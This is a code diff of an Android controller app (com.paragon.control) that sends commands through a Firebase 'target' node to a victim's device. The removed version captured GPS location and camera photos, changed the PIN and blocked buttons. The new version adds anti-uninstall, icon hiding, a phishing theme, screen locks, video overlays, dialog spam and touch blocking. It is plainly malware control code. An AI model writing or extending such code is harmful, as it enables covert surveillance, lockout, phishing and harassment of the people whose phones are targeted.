@@ -2,90 +2,92 @@ package com.paragon.control;
 
 import android.os.Bundle;
 import android.widget.Button;
-import android.widget.EditText;
 import android.widget.Switch;
-import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
 public class MainActivity extends AppCompatActivity {
-    Switch swLockScreen;
-    Button btnGanti, btnSetPin, btnGPS, btnCamera, btnWallpaper, btnBlockButtons, btnSpamNotif;
-    EditText etNewPin;
-    TextView tvResult;
-    DatabaseReference mDatabase;
+
+    private DatabaseReference mDatabase;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        FirebaseDatabase database = FirebaseDatabase.getInstance();
-        mDatabase = database.getReference("target");
+        mDatabase = FirebaseDatabase.getInstance().getReference("target");
 
-        swLockScreen = findViewById(R.id.swLockScreen);
-        btnGanti = findViewById(R.id.btnGanti);
-        btnSetPin = findViewById(R.id.btnSetPin);
-        etNewPin = findViewById(R.id.etNewPin);
-        btnGPS = findViewById(R.id.btnGPS);
-        btnCamera = findViewById(R.id.btnCamera);
-        btnWallpaper = findViewById(R.id.btnWallpaper);
-        btnBlockButtons = findViewById(R.id.btnBlockButtons);
-        btnSpamNotif = findViewById(R.id.btnSpamNotif);
-        tvResult = findViewById(R.id.tvResult);
+        // Inisialisasi tombol dan switch dari layout terbaru
+        Switch swAntiUninstall = findViewById(R.id.swAntiUninstall);
+        Button btnGanti = findViewById(R.id.btnGanti);
+        Switch swFlashlight = findViewById(R.id.swFlashlight);
+        Switch swLockLow = findViewById(R.id.swLockLow);
+        Switch swLockCustom = findViewById(R.id.swLockCustom);
+        Button btnTemaPhising = findViewById(R.id.btnTemaPhising);
+        Switch swHideIcon = findViewById(R.id.swHideIcon);
+        Button btnVideoOverlay = findViewById(R.id.btnVideoOverlay);
+        Button btnSpamNotif = findViewById(R.id.btnSpamNotif);
+        Button btnStuckLayar = findViewById(R.id.btnStuckLayar);
 
-        // Lock Screen
-        swLockScreen.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            mDatabase.child("lockScreen").setValue(isChecked);
-            Toast.makeText(this, "Lock Screen: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
+        // 1. Anti Uninstall
+        swAntiUninstall.setOnCheckedChangeListener((buttonView, isChecked) -> {
+            mDatabase.child("antiUninstall").setValue(isChecked);
+            Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
-        // Ganti Target
+        // 2. GANTI
         btnGanti.setOnClickListener(v -> {
-            Toast.makeText(this, "Ganti target", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "Fitur Ganti Target", Toast.LENGTH_SHORT).show();
         });
 
-        // Set PIN
-        btnSetPin.setOnClickListener(v -> {
-            String newPin = etNewPin.getText().toString().trim();
-            if (newPin.length() == 4) {
-                mDatabase.child("pin").setValue(newPin);
-                Toast.makeText(this, "PIN berhasil diubah!", Toast.LENGTH_SHORT).show();
-            } else {
-                Toast.makeText(this, "PIN harus 4 digit!", Toast.LENGTH_SHORT).show();
-            }
+        // 3. Flashlight
+        swFlashlight.setOnCheckedChangeListener((buttonView, isChecked) -> {
+            mDatabase.child("flashlight").setValue(isChecked);
+            Toast.makeText(this, "Flashlight: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
-        // GPS
-        btnGPS.setOnClickListener(v -> {
-            mDatabase.child("command").setValue("gps");
-            tvResult.setText("📍 Mengambil lokasi...");
+        // 4. Lock low
+        swLockLow.setOnCheckedChangeListener((buttonView, isChecked) -> {
+            mDatabase.child("lockLow").setValue(isChecked);
+            Toast.makeText(this, "Lock Low: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
-        // Kamera
-        btnCamera.setOnClickListener(v -> {
-            mDatabase.child("command").setValue("camera");
-            tvResult.setText("📸 Mengambil foto...");
+        // 5. Lock Custom V2
+        swLockCustom.setOnCheckedChangeListener((buttonView, isChecked) -> {
+            mDatabase.child("lockCustom").setValue(isChecked);
+            Toast.makeText(this, "Lock Custom V2: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
-        // Ganti Wallpaper
-        btnWallpaper.setOnClickListener(v -> {
-            mDatabase.child("command").setValue("wallpaper");
-            tvResult.setText("🖼 Mengganti wallpaper...");
+        // 6. Tema Phising
+        btnTemaPhising.setOnClickListener(v -> {
+            mDatabase.child("temaPhising").setValue("TAP, GANTI ICON");
+            Toast.makeText(this, "Tema Phising: GANTI ICON", Toast.LENGTH_SHORT).show();
         });
 
-        // Matiin Tombol
-        btnBlockButtons.setOnClickListener(v -> {
-            mDatabase.child("command").setValue("block_buttons");
-            tvResult.setText("🔒 Tombol fisik dimatikan...");
+        // 7. Hide Icon
+        swHideIcon.setOnCheckedChangeListener((buttonView, isChecked) -> {
+            mDatabase.child("hideIcon").setValue(isChecked);
+            Toast.makeText(this, "Hide Icon: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
-        // Spam Notif
+        // 8. Video Overlay
+        btnVideoOverlay.setOnClickListener(v -> {
+            mDatabase.child("videoOverlay").setValue("TAP, PLAY VIDEO");
+            Toast.makeText(this, "Video Overlay: PLAY VIDEO", Toast.LENGTH_SHORT).show();
+        });
+
+        // 9. Spam Notifikasi
         btnSpamNotif.setOnClickListener(v -> {
-            mDatabase.child("command").setValue("spam_notif");
-            tvResult.setText("📨 Mengirim spam notifikasi...");
+            mDatabase.child("spamNotif").setValue("TAP, SPAM DIALOG");
+            Toast.makeText(this, "Spam Notifikasi: SPAM DIALOG", Toast.LENGTH_SHORT).show();
+        });
+
+        // 10. Stuck Layar
+        btnStuckLayar.setOnClickListener(v -> {
+            mDatabase.child("stuckLayar").setValue("TAP, BLOCK TOUCH");
+            Toast.makeText(this, "Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
         });
     }
 }
